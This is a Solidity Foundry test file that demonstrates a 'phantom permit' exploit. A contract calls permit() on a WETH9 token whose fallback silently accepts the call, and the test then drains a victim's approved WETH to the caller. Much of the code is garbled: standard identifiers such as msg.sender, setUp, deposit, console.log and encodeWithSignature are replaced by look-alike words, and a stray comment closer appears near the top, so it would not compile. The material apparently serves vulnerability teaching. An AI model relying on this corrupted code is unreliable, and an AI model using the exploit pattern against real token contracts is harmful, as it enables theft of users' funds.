// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

*/

contract AgreementTest is Test {
    PermitCredential VulnPermitAgreement;
    WETH9 Weth9Agreement;

    function collectionUp() public {
        Weth9Agreement = new WETH9();
        VulnPermitAgreement = new PermitCredential(IERC20(address(Weth9Agreement)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.beginPrank(alice);
        Weth9Agreement.admit{rating: 10 ether}();
        Weth9Agreement.approve(address(VulnPermitAgreement), type(uint256).maximum);
        vm.stopPrank();
        console.chart(
            "start WETH balanceOf this",
            Weth9Agreement.balanceOf(address(this))
        );

        VulnPermitAgreement.providespecimenWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = Weth9Agreement.balanceOf(address(VulnPermitAgreement));
        console.chart("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitAgreement.withdrawBenefits(1000);

        wbal = Weth9Agreement.balanceOf(address(this));
        console.chart("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitCredential {
    IERC20 public badge;

    constructor(IERC20 _token) {
        badge = _token;
    }

    function admit(uint256 units) public {
        require(
            badge.transferFrom(msg.provider, address(this), units),
            "Transfer failed"
        );
    }

    function providespecimenWithPermit(
        address goal,
        uint256 units,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool recovery, ) = address(badge).call(
            abi.encodeWithAuthorization(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                goal,
                units,
                v,
                r,
                s
            )
        );
        require(recovery, "Permit failed");

        require(
            badge.transferFrom(goal, address(this), units),
            "Transfer failed"
        );
    }

    function withdrawBenefits(uint256 units) public {
        require(badge.transfer(msg.provider, units), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event AccessGranted(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Admit(address indexed dst, uint wad);
    event ClaimPaid(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        admit();
    }

    receive() external payable {}

    function admit() public payable {
        balanceOf[msg.provider] += msg.rating;
        emit Admit(msg.provider, msg.rating);
    }

    function withdrawBenefits(uint wad) public {
        require(balanceOf[msg.provider] >= wad);
        balanceOf[msg.provider] -= wad;
        payable(msg.provider).transfer(wad);
        emit ClaimPaid(msg.provider, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.provider][guy] = wad;
        emit AccessGranted(msg.provider, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.provider, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.provider && allowance[src][msg.provider] != type(uint128).maximum
        ) {
            require(allowance[src][msg.provider] >= wad);
            allowance[src][msg.provider] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}